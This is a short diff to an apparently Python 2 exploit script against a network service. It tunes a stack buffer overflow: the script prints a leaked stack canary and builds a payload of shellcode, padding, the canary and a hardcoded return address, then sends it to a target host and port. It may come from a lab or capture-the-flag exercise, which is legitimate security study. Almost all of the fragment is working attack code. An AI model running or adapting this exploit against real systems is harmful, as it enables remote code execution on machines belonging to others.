@@ -61,14 +61,19 @@ def exploit(host, port, shellcode):
     for i in range(0, len(canary)):
         print ord(canary[i])
 
+    print ':'.join(x.encode('hex') for x in canary)
+
     time.sleep(5)
+
+    print len(shellcode)
+
     # construct query to unlink
-    buf_str = shellcode + "A" * (2048 - len(shellcode)) + canary + "A" * 4 + "\x6c\xee\xff\xbf"
+    #buf_str = shellcode + ("B" * (2048 - len(shellcode))) + canary + ("A" * 4) + "\x5c\xee\xff\xbf"
+    buf_str = shellcode + ("B" * (2048 - len(shellcode))) + canary + ("A" * 12) + "bfffee5c".decode("hex")
     if try_exploit(buf_str, host, port):
         print "failed"
     else:
         print "success"
-                         
     # remainder buffer (0x90 = NOP)"\x90"*len + shellcode + canary + ebp + return addr 0xbfffee6c
 
 ####
